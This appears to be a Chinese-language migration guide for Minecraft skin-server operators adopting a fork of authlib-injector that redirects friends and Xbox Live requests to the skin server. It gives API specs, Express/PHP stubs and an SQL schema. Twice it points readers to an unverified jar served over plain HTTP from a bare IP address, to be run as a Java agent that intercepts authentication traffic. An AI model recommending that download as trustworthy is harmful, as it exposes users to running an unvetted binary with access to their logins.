# 皮肤站迁移到 Youni Fork 快速指南

本指南帮助使用原版 authlib-injector 的皮肤站快速迁移到支持 Minecraft 26.2+ 好友功能的 Youni Fork 版本。

---

## 目录
1. [快速概览](#快速概览)
2. [前置条件](#前置条件)
3. [步骤一：更新 authlib-injector](#步骤一更新-authlib-injector)
4. [步骤二：皮肤站后端改造](#步骤二皮肤站后端改造)
5. [步骤三：测试和验证](#步骤三测试和验证)
6. [API 完整规范](#api-完整规范)
7. [常见问题](#常见问题)

---

## 快速概览

Youni Fork 相比原版 authlib-injector，新增了以下功能：

| 功能 | 描述 |
|------|------|
| ✅ 好友功能 API 拦截 | 拦截发往 Xbox Live 的好友请求，重定向到你的皮肤站 |
| ✅ 自动启用好友列表 | 无需玩家手动开启，好友按钮自动显示 |
| ✅ 跳过确认弹窗 | 点击好友按钮直接打开好友界面 |
| ✅ Realms 支持 | 可选的 Realms 功能拦截 |

---

## 前置条件

1. 你的皮肤站已实现完整的 Yggdrasil 协议
2. Minecraft 版本：26.2-snapshot-7 或更高版本
3. 你的皮肤站后端可以新增 API 接口

---

## 步骤一：更新 authlib-injector

### 1.1 下载新的 jar

从以下地址下载：
```
http://47.110.67.183:8888/down/MYbJv5G67mPJ.jar
```

### 1.2 更新启动器配置

将你启动器中使用的 authlib-injector jar 替换为新下载的版本。

启动参数保持不变（使用你的皮肤站 API 地址）：
```
-javaagent:authlib-injector.jar=https://your-skin-server.com/
```

---

## 步骤二：皮肤站后端改造

### 2.1 更新 API 元数据

在你的皮肤站根目录的 API 元数据（通常是 `/` 或 `/api/yggdrasil`）中，添加好友功能支持标记：

**响应示例：**
```json
{
  "meta": {
    "serverName": "你的皮肤站名称",
    "implementationName": "你的实现名称",
    "implementationVersion": "1.0.0",
    "feature.enable_friends_api": true
  },
  "skinDomains": [
    "your-skin-server.com"
  ],
  "signaturePublickey": "..."
}
```

**重要：** 必须添加 `"feature.enable_friends_api": true`，否则 authlib-injector 不会启用好友功能重定向。

---

### 2.2 实现好友功能 API 接口

Youni Fork 会将以下域名的请求重定向到你的皮肤站：

| 原域名 | 重定向到你的皮肤站 |
|--------|-------------------|
| `api.minecraftservices.com` | `https://your-skin-server.com/minecraftservices/...` |
| `userpresence.xboxlive.com` | `https://your-skin-server.com/friends/userpresence.xboxlive.com/...` |
| `profile.xboxlive.com` | `https://your-skin-server.com/friends/profile.xboxlive.com/...` |
| `social.xboxlive.com` | `https://your-skin-server.com/friends/social.xboxlive.com/...` |
| `peoplehub.xboxlive.com` | `https://your-skin-server.com/friends/peoplehub.xboxlive.com/...` |
| `user.auth.xboxlive.com` | `https://your-skin-server.com/friends/user.auth.xboxlive.com/...` |
| `xsts.auth.xboxlive.com` | `https://your-skin-server.com/friends/xsts.auth.xboxlive.com/...` |
| `title.mgt.xboxlive.com` | `https://your-skin-server.com/friends/title.mgt.xboxlive.com/...` |
| Realms 相关域名 | `https://your-skin-server.com/realms/...` |

---

#### 2.2.1 核心好友 API（最优先实现）

以下是 Minecraft 26.2+ 最常调用的 API：

##### 1. 获取好友列表
```
GET /minecraftservices/friends
```

**响应示例：**
```json
{
  "friends": [
    {
      "id": "069a79f4-44e9-4726-a5be-fca90e38aaf5",
      "name": "Player1",
      "lastSeen": "2026-05-18T10:30:00Z",
      "isOnline": true,
      "server": {
        "name": "My Survival Server",
        "ip": "mc.example.com",
        "port": 25565
      }
    },
    {
      "id": "12345678-1234-5678-1234-567812345678",
      "name": "Player2",
      "lastSeen": "2026-05-17T15:20:00Z",
      "isOnline": false
    }
  ],
  "incomingRequests": [],
  "outgoingRequests": [],
  "blockedPlayers": []
}
```

##### 2. 更新在线状态
```
POST /minecraftservices/presence
```

**请求体示例：**
```json
{
  "state": "ONLINE",
  "activity": "PLAYING",
  "server": {
    "name": "My Server",
    "ip": "mc.example.com",
    "port": 25565
  }
}
```

**响应：** 返回空 JSON `{}` 或 `204 No Content`

##### 3. 添加好友
```
POST /minecraftservices/friends/invite
```

**请求体：**
```json
{
  "targetId": "uuid-of-target-player"
}
```

**响应：**
```json
{
  "success": true,
  "requestId": "request-uuid-here"
}
```

##### 4. 接受好友请求
```
POST /minecraftservices/friends/accept
```

**请求体：**
```json
{
  "requestId": "request-uuid-here"
}
```

##### 5. 删除好友
```
DELETE /minecraftservices/friends/{uuid}
```

---

### 2.3 最小可行实现（快速上手）

如果你只是想快速让好友功能**显示**，可以先实现以下接口：

#### 方案 A：简单的空响应（推荐先测试）
对于所有好友相关的请求，返回空的成功响应：

**Node.js/Express 示例：**
```javascript
// 拦截所有 friends 相关的路由
app.all('/minecraftservices/friends*', (req, res) => {
  if (req.method === 'GET') {
    // 返回空好友列表
    res.json({
      friends: [],
      incomingRequests: [],
      outgoingRequests: [],
      blockedPlayers: []
    });
  } else {
    // 其他请求返回成功
    res.status(204).send();
  }
});

app.all('/friends/*', (req, res) => {
  res.status(204).send();
});

app.all('/minecraftservices/presence', (req, res) => {
  res.json({});
});
```

**PHP 示例：**
```php
<?php
$path = $_SERVER['REQUEST_URI'];

if (str_starts_with($path, '/minecraftservices/friends')) {
    if ($_SERVER['REQUEST_METHOD'] === 'GET') {
        header('Content-Type: application/json');
        echo json_encode([
            'friends' => [],
            'incomingRequests' => [],
            'outgoingRequests' => [],
            'blockedPlayers' => []
        ]);
    } else {
        http_response_code(204);
    }
    exit;
}

if (str_starts_with($path, '/friends/')) {
    http_response_code(204);
    exit;
}

if ($path === '/minecraftservices/presence') {
    header('Content-Type: application/json');
    echo '{}';
    exit;
}
?>
```

---

#### 方案 B：带示例数据的实现

如果你想展示好友功能效果，可以返回一些示例数据：

```javascript
app.get('/minecraftservices/friends', (req, res) => {
  res.json({
    friends: [
      {
        id: "069a79f4-44e9-4726-a5be-fca90e38aaf5",
        name: "Steve",
        lastSeen: new Date().toISOString(),
        isOnline: true
      },
      {
        id: "12345678-1234-5678-1234-567812345678",
        name: "Alex",
        lastSeen: new Date(Date.now() - 3600000).toISOString(),
        isOnline: false
      }
    ],
    incomingRequests: [],
    outgoingRequests: [],
    blockedPlayers: []
  });
});
```

---

## 步骤三：测试和验证

### 3.1 检查 authlib-injector 日志

启动 Minecraft 后，查看日志，应该看到以下信息：
```
[authlib-injector] [INFO] Transformed [net.minecraft.client.gui.screens.social.PlayerSocialManager] with [PlayerSocialManager Transformer (friends enabled)]
[authlib-injector] [INFO] Transformed [net.minecraft.client.gui.screens.options.OnlineOptionsScreen] with [OnlineOptions Transformer (confirmFriendsListEnabled → run)]
[authlib-injector] [DEBUG] Intercepting friends request to ...
```

### 3.2 验证好友按钮

1. 启动 Minecraft，进入主菜单
2. 应该能看到好友按钮（不需要手动开启）
3. 点击好友按钮应该直接打开好友界面（没有确认弹窗）

### 3.3 验证 API 重定向

查看你的皮肤站访问日志，应该能看到来自 Minecraft 的请求：
- `GET /minecraftservices/friends`
- `POST /minecraftservices/presence`

---

## API 完整规范

### 1. 好友数据结构
```json
{
  "id": "uuid",
  "name": "playerName",
  "lastSeen": "ISO-8601 date string",
  "isOnline": true/false,
  "server": {
    "name": "serverName",
    "ip": "serverIp",
    "port": 25565
  },
  "avatar": "optional-base64-image-data"
}
```

### 2. 完整的 API 列表

| 方法 | 路径 | 描述 |
|------|------|------|
| GET | `/minecraftservices/friends` | 获取好友列表 |
| POST | `/minecraftservices/friends/invite` | 发送好友请求 |
| POST | `/minecraftservices/friends/accept` | 接受好友请求 |
| POST | `/minecraftservices/friends/reject` | 拒绝好友请求 |
| DELETE | `/minecraftservices/friends/{uuid}` | 删除好友 |
| POST | `/minecraftservices/friends/block` | 屏蔽玩家 |
| DELETE | `/minecraftservices/friends/block/{uuid}` | 取消屏蔽 |
| POST | `/minecraftservices/presence` | 更新在线状态 |
| GET | `/minecraftservices/profile/{uuid}` | 获取玩家资料 |

---

## 常见问题

### Q1: 好友按钮还是不显示？
A: 检查以下几点：
1. 确认你使用的是 Youni Fork 版本的 authlib-injector
2. 检查 API 元数据是否包含 `"feature.enable_friends_api": true`
3. 查看游戏日志，确认 Transformer 是否加载

### Q2: 点击好友按钮出现错误？
A: 确保你的皮肤站返回了正确格式的 JSON 响应。至少要返回：
```json
{"friends":[],"incomingRequests":[],"outgoingRequests":[],"blockedPlayers":[]}
```

### Q3: 需要数据库表设计吗？
A: 如果你想实现完整功能，推荐以下表结构：
```sql
-- 好友关系表
CREATE TABLE friends (
    id INT PRIMARY KEY AUTO_INCREMENT,
    player_uuid VARCHAR(36) NOT NULL,
    friend_uuid VARCHAR(36) NOT NULL,
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    UNIQUE KEY unique_friendship (player_uuid, friend_uuid)
);

-- 好友请求表
CREATE TABLE friend_requests (
    id INT PRIMARY KEY AUTO_INCREMENT,
    from_uuid VARCHAR(36) NOT NULL,
    to_uuid VARCHAR(36) NOT NULL,
    status ENUM('pending', 'accepted', 'rejected') DEFAULT 'pending',
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
);

-- 在线状态表
CREATE TABLE player_presence (
    uuid VARCHAR(36) PRIMARY KEY,
    is_online BOOLEAN DEFAULT FALSE,
    last_seen TIMESTAMP,
    server_name VARCHAR(255),
    server_ip VARCHAR(255),
    server_port INT
);
```

### Q4: Realms 相关请求需要处理吗？
A: 可以暂时返回 204 或 404，不影响好友功能使用。

---

## 技术支持

如有问题，请访问：
- GitHub 仓库：https://github.com/silent-QAQ/authlib-injector-youni-fork
- 下载地址：http://47.110.67.183:8888/down/MYbJv5G67mPJ.jar
